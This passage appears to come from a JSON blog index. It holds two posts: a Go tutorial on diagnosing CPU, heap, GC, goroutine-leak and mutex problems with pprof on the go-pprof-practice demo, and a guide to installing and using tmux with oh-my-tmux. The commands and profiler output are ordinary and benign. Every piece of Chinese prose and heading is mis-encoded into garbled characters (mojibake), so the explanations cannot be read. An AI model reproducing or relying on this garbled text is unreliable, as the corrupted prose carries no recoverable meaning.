net/http.HandlerFunc.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.serverHandler.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http/pprof.Index\n           0     0%   100%     1.16MB   100%  net/http/pprof.handler.ServeHTTP\n           0     0%   100%     1.16MB   100%  runtime/pprof.(*Profile).WriteTo\n           0     0%   100%     1.16MB   100%  runtime/pprof.writeGoroutine\n           \n           \n  # tree ä»¥æ ‘çŠ¶æ˜¾ç¤º\n  (pprof) tree\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n  ----------------------------------------------------------+-------------\n        flat  flat%   sum%        cum   cum%   calls calls% + context\n  ----------------------------------------------------------+-------------\n                                              1.16MB   100% |   runtime/pprof.writeGoroutine\n      1.16MB   100%   100%     1.16MB   100%                | runtime/pprof.writeGoroutineStacks\n      \n      \n  # png ä»¥å›¾ç‰‡æ ¼å¼è¾“å‡º,åœ¨å½“å‰ç›®å½•ä¸‹\n  (pprof) png\n  Generating report in profile001.png\n  \n  # svg ç”Ÿæˆæµè§ˆå™¨å¯ä»¥è¯†åˆ«çš„svgæ–‡ä»¶,åœ¨å½“å‰ç›®å½•ä¸‹, ç›´æ¥ç‚¹å¼€åœ¨æµè§ˆå™¨æŸ¥çœ‹\n  (pprof) png\n  Generating report in profile001.png\n  ```\n  \n  \n  \n  | åˆ—å  | å«ä¹‰                                                         |\n  | ----- | ------------------------------------------------------------ |\n  | flat  | æœ¬å‡½æ•°çš„æ‰§è¡Œè€—æ—¶                                             |\n  | flat% | flat å  CPU æ€»æ—¶é—´çš„æ¯”ä¾‹ã€‚ç¨‹åºæ€»è€—æ—¶ 16.22s, Eat çš„ 16.19s å äº† 99.82% |\n  | sum%  | å‰é¢æ¯ä¸€è¡Œçš„ flat å æ¯”æ€»å’Œ                                   |\n  | cum   | ç´¯è®¡é‡ã€‚æŒ‡è¯¥å‡½æ•°åŠ ä¸Šè¯¥å‡½æ•°è°ƒç”¨çš„å‡½æ•°æ€»è€—æ—¶                   |\n  | cum%  | cum å  CPU æ€»æ—¶é—´çš„æ¯”ä¾‹                                      |\n  \n  \n\n\n# 3. å®è·µ\n\n```bash\n# ä¸‹è½½æµ‹è¯•é¡¹ç›®\ngit clone https://github.com/wolfogre/go-pprof-practice\n\n# æ‰§è¡Œ\ngo build\n./go-pprof-practice\n```\n\n\n\n### 3.1 æ’æŸ¥CPU\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/profile\n\n# top æŸ¥çœ‹\n(pprof) top\nShowing nodes accounting for 15270ms, 99.09% of 15410ms total\nDropped 40 nodes (cum <= 77.05ms)\nShowing top 10 nodes out of 11\n      flat  flat%   sum%        cum   cum%\n   12310ms 79.88% 79.88%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat\n    1170ms  7.59% 87.48%     1170ms  7.59%  runtime.memmove\n     800ms  5.19% 92.67%      800ms  5.19%  runtime.memclrNoHeapPointers\n     520ms  3.37% 96.04%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n     470ms  3.05% 99.09%      470ms  3.05%  runtime.asyncPreempt\n         0     0% 99.09%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Live\n         0     0% 99.09%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0% 99.09%    15310ms 99.35%  main.main\n         0     0% 99.09%     1980ms 12.85%  runtime.growslice\n         0     0% 99.09%    15310ms 99.35%  runtime.main\n         \n         \nå¾ˆæ˜æ˜¾ï¼ŒCPU å ç”¨è¿‡é«˜æ˜¯ github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat é€ æˆçš„ã€‚   \n\n# è¾“å…¥ list Eatï¼ŒæŸ¥çœ‹é—®é¢˜å…·ä½“åœ¨ä»£ç çš„å“ªä¸€ä¸ªä½ç½®ï¼š\n\n(pprof) list Eat\nTotal: 15.41s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/felidae/tiger/tiger.go\n    12.31s     12.78s (flat, cum) 82.93% of Total\n         .          .     19:}\n         .          .     20:\n         .          .     21:func (t *Tiger) Eat() {\n         .          .     22:   log.Println(t.Name(), \"eat\")\n         .          .     23:   loop := 10000000000\n    12.31s     12.78s     24:   for i := 0; i < loop; i++ {\n         .          .     25:           // do nothing\n         .          .     26:   }\n         .          .     27:}\n         .          .     28:\n         .          .     29:func (t *Tiger) Drink() {\n         \n\nå¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ç¬¬ 24 è¡Œé‚£ä¸ªä¸€ç™¾äº¿æ¬¡ç©ºå¾ªç¯å ç”¨äº†å¤§é‡ CPU æ—¶é—´ï¼Œè‡³æ­¤ï¼Œé—®é¢˜å®šä½æˆåŠŸï¼\n\n\n# è¾“å…¥ web, ä¼šåœ¨æµè§ˆå™¨å¼¹å‡ºä¸€ä¸ªå›¾\nå›¾ä¸­ï¼Œtiger.(*Tiger).Eat å‡½æ•°çš„æ¡†ç‰¹åˆ«å¤§ï¼Œç®­å¤´ç‰¹åˆ«ç²—ï¼Œpprof ç”Ÿæ€•ä½ ä¸çŸ¥é“è¿™ä¸ªå‡½æ•°çš„ CPU å ç”¨å¾ˆé«˜ã€‚\n```\n\n![1](pprofæ’æŸ¥golangé—®é¢˜/1.png)\n\n\n\n### 3.2 æ’æŸ¥å†…å­˜\n\n```bash\n# æŠŠæ­»å¾ªç¯ä»£ç æ³¨é‡Š, æ¥ç€æµ‹è¯•, çœ‹å†…å­˜ä½¿ç”¨, æ³¨æ„æ˜¯ heap\ngo tool pprof http://localhost:6060/debug/pprof/heap\n\n# çœ‹ top\n(pprof) top\nShowing nodes accounting for 768MB, 100% of 768MB total\n      flat  flat%   sum%        cum   cum%\n     768MB   100%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n         0     0%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0%   100%      768MB   100%  main.main\n         0     0%   100%      768MB   100%  runtime.main\n\n# æŸ¥çœ‹å ç”¨æœ€å¤šçš„è¿™ä¸ªå‡½æ•°\n(pprof) list Steal\nTotal: 768MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/muridae/mouse/mouse.go\n     768MB      768MB (flat, cum)   100% of Total\n         .          .     45:\n         .          .     46:func (m *Mouse) Steal() {\n         .          .     47:   log.Println(m.Name(), \"steal\")\n         .          .     48:   max := constant.Gi\n         .          .     49:   for len(m.buffer) * constant.Mi < max {\n     768MB      768MB     50:           m.buffer = append(m.buffer, [constant.Mi]byte{})\n         .          .     51:   }\n         .          .     52:}\n         \nå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰ä¸ªå¾ªç¯ä¼šä¸€ç›´å‘ m.buffer é‡Œè¿½åŠ é•¿åº¦ä¸º 1 MiB çš„æ•°ç»„ï¼Œç›´åˆ°æ€»å®¹é‡åˆ°è¾¾ 1 GiB ä¸ºæ­¢ï¼Œä¸”ä¸€ç›´ä¸é‡Šæ”¾è¿™äº›å†…å­˜ï¼Œè¿™å°±éš¾æ€ªä¼šæœ‰è¿™ä¹ˆé«˜çš„å†…å­˜å ç”¨äº†ã€‚\n\n# è¾“å…¥ web, å†æ¬¡åœ¨æµè§ˆå™¨æ„Ÿå—ä¸€ä¸‹, ä¹Ÿå¯ä»¥è¾“å…¥ png\n```\n\n![1](pprofæ’æŸ¥golangé—®é¢˜/2.png)\n\n\n\n### 3.3 æ’æŸ¥ GC\n\n```bash\n# é¢‘ç¹çš„ GC å¯¹ golang ç¨‹åºæ€§èƒ½çš„å½±å“ä¹Ÿæ˜¯éå¸¸ä¸¥é‡çš„ã€‚è™½ç„¶ç°åœ¨è¿™ä¸ªç¨‹åºå†…å­˜ä½¿ç”¨é‡å¹¶ä¸é«˜ï¼Œä½†è¿™ä¼šä¸ä¼šæ˜¯é¢‘ç¹ GC ä¹‹åçš„å‡è±¡å‘¢ï¼Ÿ\n\n# ä¸ºäº†è·å–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ GC æ—¥å¿—ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé€€å‡ºç‚¸å¼¹ç¨‹åºï¼Œå†åœ¨é‡æ–°å¯åŠ¨å‰èµ‹äºˆä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒåŒæ—¶ä¸ºäº†é¿å…å…¶ä»–æ—¥å¿—çš„å¹²æ‰°ï¼Œä½¿ç”¨ grep ç­›é€‰å‡º GC æ—¥å¿—æŸ¥çœ‹ï¼š\nGODEBUG=gctrace=1 ./go-pprof-practice | grep gc\n\ngc 1 @0.003s 2%: 0.004+0.44+0.004 ms clock, 0.004+0.21/0.11/0+0.004 ms cpu, 16->16->0 MB, 17 MB goal, 1 P\ngc 2 @6.201s 0%: 0.041+2.9+0.004 ms clock, 0.041+0.31/0/0+0.004 ms cpu, 7->7->6 MB, 8 MB goal, 1 P\ngc 3 @6.204s 0%: 0.026+6.2+0.003 ms clock, 0.026+0.23/0/0+0.003 ms cpu, 14->14->12 MB, 15 MB goal, 1 P\ngc 4 @6.211s 0%: 0.038+10+0.003 ms clock, 0.038+0.23/0/0+0.003 ms cpu, 28->28->24 MB, 29 MB goal, 1 P\ngc 5 @6.223s 0%: 0.023+26+0.002 ms clock, 0.023+0/0.23/0+0.002 ms cpu, 56->56->48 MB, 57 MB goal, 1 P\ngc 6 @6.251s 0%: 0.038+47+0.003 ms clock, 0.038+0/0.25/0+0.003 ms cpu, 112->112->96 MB, 113 MB goal, 1 P\ngc 7 @6.301s 0%: 0.051+93+0.003 ms clock, 0.051+0/0.24/0+0.003 ms cpu, 224->224->192 MB, 225 MB goal, 1 P\ngc 8 @6.407s 0%: 0.023+192+0.004 ms clock, 0.023+0/0.28/0+0.004 ms cpu, 448->448->384 MB, 449 MB goal, 1 P\ngc 9 @6.631s 0%: 0.053+397+0.003 ms clock, 0.053+0/0.25/0+0.003 ms cpu, 896->896->768 MB, 897 MB goal, 1 P\ngc 10 @7.080s 0%: 0.052+1205+0.003 ms clock, 0.052+0/0.24/0+0.003 ms cpu, 1792->1792->1536 MB, 1793 MB goal, 1 P\n\n\nå¯ä»¥çœ‹åˆ°ï¼ŒGC å·®ä¸å¤šæ¯ 3 ç§’å°±å‘ç”Ÿä¸€æ¬¡ï¼Œä¸”æ¯æ¬¡ GC éƒ½ä¼šä» 16MB æ¸…ç†åˆ°å‡ ä¹ 0MBï¼Œè¯´æ˜ç¨‹åºåœ¨ä¸æ–­çš„ç”³è¯·å†…å­˜å†é‡Šæ”¾ï¼Œè¿™æ˜¯é«˜æ€§èƒ½ golang ç¨‹åºæ‰€ä¸å…è®¸çš„ã€‚\n\næ‰€ä»¥æ¥ä¸‹æ¥ä½¿ç”¨ pprof æ’æŸ¥æ—¶ï¼Œæˆ‘ä»¬åœ¨ä¹çš„ä¸æ˜¯ä»€ä¹ˆåœ°æ–¹åœ¨å ç”¨å¤§é‡å†…å­˜ï¼Œè€Œæ˜¯ä»€ä¹ˆåœ°æ–¹åœ¨ä¸åœåœ°ç”³è¯·å†…å­˜ï¼Œè¿™ä¸¤è€…æ˜¯æœ‰åŒºåˆ«çš„ã€‚\n\n#ç”±äºå†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾é¢‘åº¦æ˜¯éœ€è¦ä¸€æ®µæ—¶é—´æ¥ç»Ÿè®¡çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬ä¿è¯ç‚¸å¼¹ç¨‹åºå·²ç»è¿è¡Œäº†å‡ åˆ†é’Ÿä¹‹åï¼Œå†è¿è¡Œå‘½ä»¤ï¼š\ngo tool pprof http://localhost:6060/debug/pprof/allocs\n\n# top\n(pprof) top\nShowing nodes accounting for 16MB, 100% of 16MB total\n      flat  flat%   sum%        cum   cum%\n      16MB   100%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run (inline)\n         0     0%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Live\n         0     0%   100%       16MB   100%  main.main\n         0     0%   100%       16MB   100%  runtime.main\n         \n# list Run         \n(pprof) list Run\nTotal: 16MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/dog/dog.go\n      16MB       16MB (flat, cum)   100% of Total\n         .          .     38:   log.Println(d.Name(), \"pee\")\n         .          .     39:}\n         .          .     40:\n         .          .     41:func (d *Dog) Run() {\n         .          .     42:   log.Println(d.Name(), \"run\")\n      16MB       16MB     43:   _ = make([]byte, 16 * constant.Mi)\n         .          .     44:}\n         .          .     45:\n         .          .     46:func (d *Dog) Howl() {\n         .          .     47:   log.Println(d.Name(), \"howl\")\n         .          .     48:}\n         \n         \nå¯ä»¥çœ‹åˆ° github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run ä¼šè¿›è¡Œæ— æ„ä¹‰çš„å†…å­˜ç”³è¯·ï¼Œè€Œè¿™ä¸ªå‡½æ•°åˆä¼šè¢«é¢‘ç¹è°ƒç”¨ï¼Œè¿™æ‰å¯¼è‡´ç¨‹åºä¸åœåœ°è¿›è¡Œ GC\n```\n\n![1](pprofæ’æŸ¥golangé—®é¢˜/3.png)\n\n### 3.4 æ’æŸ¥åç¨‹æ³„éœ²\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/goroutine\n\n# top æŸ¥çœ‹\n(pprof) top\nShowing nodes accounting for 14, 100% of 14 total\nShowing top 10 nodes out of 27\n      flat  flat%   sum%        cum   cum%\n        12 85.71% 85.71%         12 85.71%  runtime.gopark\n         1  7.14% 92.86%          1  7.14%  net/http.(*connReader).backgroundRead\n         1  7.14%   100%          1  7.14%  runtime/pprof.writeRuntimeProfile\n         0     0%   100%         10 71.43%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1\n         0     0%   100%          1  7.14%  internal/poll.(*FD).Accept\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).wait\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).waitRead (inline)\n         0     0%   100%          1  7.14%  internal/poll.runtime_pollWait\n         0     0%   100%          1  7.14%  main.main\n         0     0%   100%          1  7.14%  main.main.func1\n\n# list å‡½æ•°\n(pprof) list Drink\nTotal: 14\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         10 (flat, cum) 71.43% of Total\n         .          .     29:\n         .          .     30:func (w *Wolf) Drink() {\n         .          .     31:   log.Println(w.Name(), \"drink\")\n         .          .     32:   for i := 0; i < 10; i++ {\n         .          .     33:           go func() {\n         .         10     34:                   time.Sleep(30 * time.Second)\n         .          .     35:           }()\n         .          .     36:   }\n         .          .     37:}\n         .          .     38:\n         .          .     39:func (w *Wolf) Shit() {\n         \nå¯ä»¥çœ‹åˆ°ï¼ŒDrink å‡½æ•°æ¯æ¬¡å›é‡Šæ”¾ 10 ä¸ªåç¨‹å‡ºå»ï¼Œæ¯ä¸ªåç¨‹ä¼šç¡çœ  30 ç§’å†é€€å‡ºï¼Œè€Œ Drink å‡½æ•°åˆä¼šè¢«åå¤è°ƒç”¨ï¼Œè¿™æ‰å¯¼è‡´å¤§é‡åç¨‹æ³„éœ²ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœé‡Šæ”¾å‡ºçš„åç¨‹ä¼šæ°¸ä¹…é˜»å¡ï¼Œé‚£ä¹ˆæ³„éœ²çš„åç¨‹æ•°ä¾¿ä¼šæŒç»­å¢åŠ ï¼Œå†…å­˜çš„å ç”¨ä¹Ÿä¼šæŒç»­å¢åŠ ï¼Œé‚£è¿Ÿæ—©æ˜¯ä¼šè¢«æ“ä½œç³»ç»Ÿæ€æ­»çš„ã€‚         \n```\n\n![1](pprofæ’æŸ¥golangé—®é¢˜/4.png)\n\n### 3.5 æ’æŸ¥é”çš„äº‰ç”¨\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/mutex\n\n\n# top æŸ¥çœ‹\n(pprof) top\nShowing nodes accounting for 1s, 100% of 1s total\n      flat  flat%   sum%        cum   cum%\n        1s   100%   100%         1s   100%  sync.(*Mutex).Unlock (inline)\n         0     0%   100%         1s   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1\n         \n# list å‡½æ•°       \n(pprof) list Howl\nTotal: 1s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         1s (flat, cum)   100% of Total\n         .          .     53:\n         .          .     54:   m := &sync.Mutex{}\n         .          .     55:   m.Lock()\n         .          .     56:   go func() {\n         .          .     57:           time.Sleep(time.Second)\n         .         1s     58:           m.Unlock()\n         .          .     59:   }()\n         .          .     60:   m.Lock()\n         .          .     61:}\n         \nè¿™ä¸ªé”ç”±ä¸»åç¨‹ Lockï¼Œå¹¶å¯åŠ¨å­åç¨‹å» Unlockï¼Œä¸»åç¨‹ä¼šé˜»å¡åœ¨ç¬¬äºŒæ¬¡ Lock è¿™å„¿ç­‰å¾…å­åç¨‹å®Œæˆä»»åŠ¡ï¼Œä½†ç”±äºå­åç¨‹è¶³è¶³ç¡çœ äº†ä¸€ç§’ï¼Œå¯¼è‡´ä¸»åç¨‹ç­‰å¾…è¿™ä¸ªé”é‡Šæ”¾è¶³è¶³ç­‰äº†ä¸€ç§’é’Ÿã€‚         \n```\n\n![1](pprofæ’æŸ¥golangé—®é¢˜/5.png)\n\n### 3.6 æ’æŸ¥é˜»å¡æ“ä½œ\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/block\n\n# top list web å¤§æ³•\n```\n\n\n\n# 4. ç«ç„°å›¾\n\n```bash\n# åœ¨ä¸Šé¢ä¾‹å­ä¸­\ngo tool pprof -seconds 10 http://127.0.0.1:6060/debug/pprof/profile\n\ngo tool pprof -http=:8081 ~/pprof/pprof.samples.cpu.002.pb.gz\n\n# å¯ä»¥åœ¨é¡µé¢ä¸­ view->flamegraph æŸ¥çœ‹ç«ç„°å›¾\nhttp://localhost:8081/ui/flamegraph\n```\n\n![1](pprofæ’æŸ¥golangé—®é¢˜/6.png)\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://golang.org/pkg/net/http/pprof/\n+ https://blog.wolfogre.com/posts/go-ppof-practice/\n\n","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"iterm2ä¸Štmuxå’Œoh_my_tmuxçš„ä½¿ç”¨","url":"%2Fp%2F29f1e79c.html","content":"\ntmuxæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„ç»ˆç«¯å¤ç”¨è½¯ä»¶ï¼Œå®ƒæ¯”Screenæ›´åŠ å¼ºå¤§ã€‚ tmuxä¹‹æ‰€ä»¥å—äººä»¬å–œçˆ±ï¼Œä¸»è¦å¾—ç›Šäºä»¥ä¸‹åŠŸèƒ½ï¼š\n\n- ä¸æ»‘åˆ†å±ï¼ˆsplitï¼‰ï¼Œè™½ç„¶iTem2ä¹Ÿæä¾›äº†æ¨ªå‘å’Œç«–å‘åˆ†å±åŠŸèƒ½ï¼Œä½†è¿™ç§åˆ†å±åŠŸèƒ½éå¸¸æ‹™åŠ£ï¼Œå®Œå…¨ç­‰åŒäºå±å¹•æ–°å¼€ä¸€ä¸ªçª—å£ï¼Œæ–°å¼€çš„paneä¸ä¼šè‡ªåŠ¨è¿›å…¥åˆ°å½“å‰ç›®å½•ï¼Œä¹Ÿæ²¡æœ‰è®°ä½å½“å‰ç™»å½•çŠ¶æ€ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘sshè¿›å…¥åˆ°è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼ŒiTem2æ–°å¼€çš„paneä¸­ï¼Œæˆ‘ä¾ç„¶è¦é‡æ–°èµ°ä¸€ésshç™»å½•çš„è€è·¯ï¼ˆomgï¼‰ã€‚tmuxå°±ä¸ä¼šè¿™æ ·ï¼Œtmuxçª—å£ä¸­ï¼Œæ–°å¼€çš„paneï¼Œé»˜è®¤è¿›å…¥åˆ°ä¹‹å‰çš„è·¯å¾„ï¼Œå¦‚æœæ˜¯sshè¿æ¥ï¼Œç™»å½•çŠ¶æ€ä¹Ÿä¾æ—§ä¿æŒç€ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘å°±å¯ä»¥éšæ„çš„å¢åˆ paneï¼Œè¿™ç§çµæ´»æ€§ï¼Œå¥½å¤„ä¸è¨€è€Œå–»ã€‚\n\n- ä¿æŠ¤ç°åœºï¼ˆattachï¼‰ï¼Œå³ä½¿å‘½ä»¤è¡Œçš„å·¥ä½œåªè¿›è¡Œåˆ°ä¸€åŠï¼Œå…³é—­ç»ˆç«¯åè¿˜å¯ä»¥é‡æ–°è¿›å…¥åˆ°æ“ä½œç°åœºï¼Œç»§ç»­å·¥ä½œã€‚å¯¹äºsshè¿œç¨‹è¿æ¥è€Œè¨€ï¼Œå³ä½¿ç½‘ç»œä¸ç¨³å®šä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œæ‰çº¿åé‡æ–°è¿æ¥ï¼Œå¯ä»¥ç›´å¥”ç°åœºï¼Œä¹‹å‰è¿è¡Œä¸­çš„ä»»åŠ¡ï¼Œä¾æ—§åœ¨è·‘ï¼Œå°±å¥½åƒä»æ¥æ²¡æœ‰ç¦»å¼€è¿‡ä¸€æ ·ï¼›ç‰¹åˆ«æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šè¿è¡Œè€—æ—¶çš„ä»»åŠ¡ï¼Œtmuxå¯ä»¥å¸®ä½ ä¸€ç›´ä¿æŒä½ä¼šè¯ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œä½ å°±å¯ä»¥éšæ—¶éšåœ°æ”¾å¿ƒåœ°è¿›è¡Œç§»åŠ¨åŠå…¬ï¼Œåªè¦ä½ é™„è¿‘çš„è®¡ç®—æœºè£…æœ‰tmuxï¼ˆæ²¡æœ‰ä½ ä¹Ÿå¯ä»¥èŠ±å‡ åˆ†é’Ÿè£…ä¸€ä¸ªï¼‰ï¼Œä½ å°±èƒ½ç»§ç»­åˆšæ‰çš„å·¥ä½œã€‚\n\n<!-- more -->\n\n+ å…ˆä¸Šæ•ˆæœå›¾\n\n![1](iterm2ä¸Štmuxå’Œoh_my_tmuxçš„ä½¿ç”¨/1.png)\n\n![1](iterm2ä¸Štmuxå’Œoh_my_tmuxçš„ä½¿ç”¨/2.png)\n\n\n\n# 1. å®‰è£…\n\n### 1.1 tmux å®‰è£…\n\n```bash\nbrew install tmux #mac\n\napt-get install tmux #linux\n```\n\n\n\n### 1.2 oh my tmux å®‰è£…\n\n+ https://github.com/gpakosz/.tmux\n\n```bash\ncd\ngit clone https://github.com/gpakosz/.tmux.git\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n```\n\nä»¥åé…ç½®ä¿®æ”¹   ~/.tmux.conf.local å³å¯. \n\n\n\n# 2. tmux ä½¿ç”¨\n\ntmuxä½¿ç”¨C/Sæ¨¡å‹æ„å»ºï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å•å…ƒæ¨¡å—ï¼š\n\n- serveræœåŠ¡å™¨ã€‚è¾“å…¥tmuxå‘½ä»¤æ—¶å°±å¼€å¯äº†ä¸€ä¸ªæœåŠ¡å™¨ã€‚\n- sessionä¼šè¯ã€‚ä¸€ä¸ªæœåŠ¡å™¨å¯ä»¥åŒ…å«å¤šä¸ªä¼šè¯\n- windowçª—å£ã€‚ä¸€ä¸ªä¼šè¯å¯ä»¥åŒ…å«å¤šä¸ªçª—å£ã€‚\n- paneé¢æ¿ã€‚ä¸€ä¸ªçª—å£å¯ä»¥åŒ…å«å¤šä¸ªé¢æ¿ã€‚\n\næˆ‘ä¹ æƒ¯ä¸€ä¸ªé¡¹ç›®ç”¨ä¸€ä¸ª session, ä¸€ä¸ªå·¥ä½œåŒºç”¨ä¸€ä¸ª window, å¿«æ·æ“ä½œå¼€å§‹ä¸€ä¸ª panel. å¦‚æœåˆšå¼€å§‹è®°ä¸ä½ tmuxçš„æ“ä½œ, ä¸€å®šå¤šç»ƒä¹ , ä¸€å®šå¤šç”¨, ä½ ä¼šå‘ç°ç¦»ä¸å¼€å®ƒäº†.\n\n\n\n### 2.1 tmux å‘½ä»¤\n\n```bash\ntmux ls # æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„session\n\ntmux\t# æ–°å»ºä¸€ä¸ªæ— åç§°çš„ä¼šè¯, å¯ä»¥ç”¨$å†æ”¹å\n\ntmux new -s demo # æ–°å»ºä¸€ä¸ªåç§°ä¸ºdemoçš„ä¼šè¯, \n\ntmux attach -t session_name # è¿æ¥ä¹‹å‰é€€å‡ºçš„session\n\ntmux attach-session  # å¿«é€Ÿè¿›å…¥ session\n\ntmux kill-server  #å…³é—­æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„ä¼šè¯éƒ½å°†å…³é—­\n```\n\n\n\n### 2.2 sessionæ“ä½œ\n\n+ æ–°å»º <prefix> C-c\n\n+ åˆ é™¤  :kill-session  æˆ–  tmux ls ä»¥å tmux kill-session -t åå­—\n\n+ é€‰æ‹© s\n\n+ é‡å‘½å $\n\n+ é€€å‡º  d\n\n\n\n### 2.3 window æ“ä½œ\n\n+ æ–°å»º   c\n+ å…³é—­  ctrl+d æˆ–   &\n+ åˆ—è¡¨  w   å¯åˆ‡åˆ°å…¶ä»– session\n\n+ é‡å‘½å  ,\n\n+ è·³è·ƒ  0-9\n+ å‘å·¦ C-h  æˆ–   n\n+ å‘å³ C-l  æˆ–   p\n\n\n\n### 2.4 panel æ“ä½œ\n\n+ æ–°å»ºä¸Šä¸‹   - æˆ–  \"\n\n+ æ–°å»ºå·¦å³   _  æˆ– %\n\n+ å…³é—­  ctrl+d  æˆ– x\n\n+ åˆ‡æ¢ï¼š ç©ºæ ¼é”®\n\n+ ç§»åŠ¨    hjkl é”® æˆ– ä¸Šä¸‹å·¦å³é”®\n\n+ æœ€å¤§åŒ–  z\n\n+ å˜çª—å£  !   å¦‚æœåªæ˜¯ä¸´æ—¶å˜ window, ç”¨+\n\n\n\n### 2.5 Oh My Tmux æ“ä½œ\n\n```bash\n#è‡ªåŠ¨æŠŠ ctrl + a å½“åšç¬¬äºŒä¸ªå‰ç¼€\n\n<prefix> m #åˆ‡æ¢é¼ æ ‡å¼€å¯çŠ¶æ€\n\n<prefix> e #è‡ªåŠ¨æ‰“å¼€é…ç½®\n\n<prefix> r # åˆ·æ–°é…ç½®\n\n<prefix> C-c  #æ–°å»ºä¸€ä¸ª Session\n\n<prefix> - å’Œ <prefix> _  #æ°´å¹³å’Œå‚ç›´åˆ†å±\n\n<prefix> + #è®©å½“å‰ panel æˆä¸º window, æ³¨æ„ å†ä¸€æ¬¡è¿˜èƒ½å›åˆ° panel\n```\n\n\n\n### 2.6 tmux å¤åˆ¶æ¨¡å¼\n\n```bash\nvi ~/.tmux.conf.local\n\n# æ‰“å¼€ä¸‹é¢çš„é…ç½®\nset -g mode-keys vi\n```\n\nä¾‹å¦‚æˆ‘çš„æ§åˆ¶é”®ä¸ºï¼šC-a\n\n1ã€ C-a [ è¿›å…¥å¤åˆ¶æ¨¡å¼\n\n2ã€ å‚è€ƒä¸Šè¡¨ç§»åŠ¨é¼ æ ‡åˆ°è¦å¤åˆ¶çš„åŒºåŸŸï¼Œç§»åŠ¨é¼ æ ‡æ—¶å¯ç”¨vimçš„æœç´¢åŠŸèƒ½\"/\",\"?\"\n\n3ã€ ç©ºæ ¼é”®å¼€å§‹é€‰æ‹©å¤åˆ¶åŒºåŸŸ\n\n4ã€ é€‰æ‹©å®Œæˆåå®‰enteré”®é€€å‡º\n\n5ã€ C-a ] ç²˜è´´\n\nå¦‚æœç”¨iterm2, å»ºè®®ç›´æ¥ä½¿ç”¨å®ƒçš„å¤åˆ¶æ¨¡å¼, ä½†ç”¨viçš„æœç´¢ç­‰æ“ä½œè¿˜æ˜¯å¾ˆå®ç”¨çš„\n\n\n\n# 3. é…ç½®\n\n### 3.1 tmux é…ç½®\n\n```bash\ntmux source-file ~/.tmux.conf # åˆ·æ–°é…ç½®\n\nset-option -g prefix2 `  # è®¾ç½®ä¸€ä¸ªä¸å¸¸ç”¨çš„`é”®ä½œä¸ºæŒ‡ä»¤å‰ç¼€ï¼ŒæŒ‰é”®æ›´å¿«äº›, å»ºè®®ç”¨ ctrl+a\n\nset -g mouse on  # æœ€å¥½å…³æ‰, è¦ä¸ç„¶å½±å“iterm2è‡ªå¸¦é¼ æ ‡é€‰ä¸­\n```\n\n\n\n### 3.2 tmux æ’ä»¶\n\n+ tpm æ’ä»¶ç®¡ç†\n\n  ```bash\n  git clone 